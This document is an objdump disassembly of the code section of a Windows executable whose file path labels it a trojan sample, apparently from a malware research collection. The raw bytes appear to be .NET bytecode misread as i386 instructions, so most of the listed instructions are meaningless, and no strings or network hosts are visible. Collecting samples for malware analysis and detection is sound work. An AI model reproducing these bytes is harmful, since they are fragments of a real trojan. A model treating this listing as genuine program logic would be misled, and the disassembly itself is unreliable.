
malware_samples/trojan/e5dc5a9abb00aab4b7234914d55c2674830d7bcdae6b90a78650c8718bbb316b.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	00 d1                	add    %dl,%cl
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 d0                	add    %dl,%al
  402015:	76 00                	jbe    0x402017
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	06                   	push   %es
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 ba 21 00       	and    $0x21ba72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 b2                	jb     0x4021a8
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 ba 21 00       	and    $0x21ba72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 c4                	jb     0x4021ea
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 c4 26 00       	and    $0x26c472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 b4             	add    %dh,-0x4c(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
